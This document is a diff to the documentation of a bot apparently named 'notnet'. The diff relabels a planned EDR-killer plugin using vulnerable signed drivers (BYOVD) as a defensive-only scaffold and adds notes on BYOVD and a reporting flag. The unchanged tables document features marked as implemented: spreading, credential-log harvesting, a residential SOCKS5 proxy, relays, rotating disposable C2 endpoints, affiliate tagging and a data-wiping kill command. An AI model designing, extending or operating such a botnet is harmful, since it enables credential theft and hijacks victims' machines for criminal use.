@@ -238,7 +238,7 @@ into the binary.
   | `proxy`    | Residential SOCKS5 forward proxy (#89) | `proxy_start()` (token-gated, fail-closed) |
   | `relay`    | ORB-style single-hop relay (#91) | `relay_start()` (token-gated, fail-closed) |
   | `cred-log` | Credential-log harvest buffer (#90) | passive — `plugin status` reports the buffered count |
-  | `byovd`    | EDR-killer via signed drivers (#94) | **planned** — registered, every op refuses |
+  | `byovd`    | BYOVD defense scaffold (#94) | **defensive-only research scaffold** — registered, every op refuses; no driver-loading code ships |
 
   Lifecycle: `plugin <name> load|run|unload` plus `plugin status` (list
   the whole registry with loaded state) and `plugin <name> status`
@@ -260,6 +260,32 @@ into the binary.
   use the same fail-closed SHA-256 pinning as the payload path
   (`payload_sha256` pattern) — a plugin whose hash does not match its
   pinned value is discarded, never executed.
+
+### Defense Neutralization (BYOVD)
+
+2026 judgment — kernel rootkits as implemented (driver replacement,
+SSDT hooks, ADS hiding) **lost to platform hardening**: signature
+enforcement, Secure Boot, HVCI, and PatchGuard made custom kernel
+stealth a losing bet. The *objective* (kernel-level neutralization of
+security tooling) is now commodity via **BYOVD** (bring-your-own-
+vulnerable-driver): drop a legitimately-signed but vulnerable third-
+party driver and abuse it — ESET catalogued ~90 EDR killers, 54 abusing
+a shared pool of 35 legitimately signed drivers — and even that is a
+cat-and-mouse game (the vulnerable-driver blocklist quarantined a
+dropped driver 127 ms after it hit disk in a 2026 case).
+
+- **notnet ships NO driver-loading code.** The `byovd` plugin is a
+  **defensive-only research scaffold**: it registers in the built-in
+  registry but refuses every operation with a clear log, and boot
+  auto-load leaves it unloaded. This repo's output is documentation +
+  detection, never deployment — see `references/byovd.md` for the full
+  research note and a Windows defender checklist (vulnerable-driver
+  blocklist, HVCI/Memory Integrity, WDAC/App Control, driver-signing
+  enforcement, driver-load telemetry).
+- **`byovd_guard` config flag** (default 0): the defensive posture
+  toggle. When set (config file or `config_set byovd_guard=1`), the
+  plugin's load callback reports that BYOVD-style driver abuse is
+  **blocked**. Reporting only — there is no capability to enable.
 
 ## Operations (Disposable Infrastructure + Affiliate Ops)
 
@@ -332,7 +358,7 @@ shared secret). The command queue is rate-limited to 10 commands/second.
 | config_set | `config_set <key>=<value>` | Implemented — allowlisted runtime config keys |
 | proxy   | `proxy on [port]` / `proxy off` | Implemented — start/stop the residential SOCKS5 forward proxy (requires `proxy_token`) |
 | relay   | `relay on [port]` / `relay off` / `relay <target> <port> [via <host>:<port>]` | Implemented — start/stop the token-authenticated ORB-style relay listener (requires `relay_token`), or probe a target's reachability/RTT directly vs. through a relay bot (per-target relay selection, single hop) |
-| plugin  | `plugin status` / `plugin <name> load\|run\|unload\|status` | Implemented — loader/plugin framework: dispatch built-in plugins by name (spread, proxy, relay, cred-log; byovd planned). Remote fetch of shared-object plugins is future work |
+| plugin  | `plugin status` / `plugin <name> load\|run\|unload\|status` | Implemented — loader/plugin framework: dispatch built-in plugins by name (spread, proxy, relay, cred-log; byovd is a defensive-only research scaffold that refuses all ops). Remote fetch of shared-object plugins is future work |
 | rotate  | `rotate` | Implemented — manually advance the disposable C2 rotation chain (primary + `c2_backup_<n>`); does not consume the automatic-churn budget |
 | kill    | `kill` | Implemented — affiliate capacity hand-back: wipe the credential-log buffer, stop proxy/relay/plugins via their stop callbacks, exit 0 (one-way door) |
 | status  | — | Implemented — heartbeat reports version, hostname, uptime, scan count, credential-log count, proxy status, relay status, affiliate tag |
@@ -369,6 +395,7 @@ The bot loads config from `/etc/notnet.conf` (key=value format):
 || `relay_port` | `1081` | Port the relay listener binds (1–65535) |
 || `relay_token` | *(none)* | Shared fleet token relay clients must present (`RELAY <token> <target> <port>`). No default — the relay will not start without it (or `NOTNET_RELAY_TOKEN` env var). Single-hop only; multi-hop chains are planned, and this is not a DHT |
 || `plugin_enabled` | `1` | 0/1 — loader/plugin framework: bootstrap the built-in plugin registry (spread, proxy, relay, cred-log) at boot and enable the `plugin` C2 command. 0 disables it; the command is refused |
+|| `byovd_guard` | `0` | 0/1 — BYOVD defense posture toggle: when set, the `byovd` plugin's load callback reports that BYOVD-style driver abuse is blocked. Reporting only — no driver-loading code exists in this repo (defensive scaffold, see `references/byovd.md`). Also settable live via `config_set byovd_guard=1` |
 || `c2_backup_1` … `c2_backup_4` | *(none)* | Disposable-infrastructure C2 rotation: backup HTTP C2 endpoints as `host:port`, contiguous from `c2_backup_1` (a gap leaves later entries unreachable). After 3 consecutive connect failures the bot rotates through the chain (primary → backups, wrapping), capped at 16 total rotations per process. Also settable live via `config_set c2_backup_<n>=host:port` |
 || `bot_tag` | *(none)* | Affiliate/operator tag (max 64 chars): the affiliate-model primitive, reported in every heartbeat (`"tag":"..."`) so the C2 can attribute bots to affiliates. Also settable live via `config_set bot_tag=...` |
 || `c2_secret` | *(none)* | Shared secret echoed by C2; HTTP/WS commands are rejected without it (or `NOTNET_C2_SECRET` env var) |
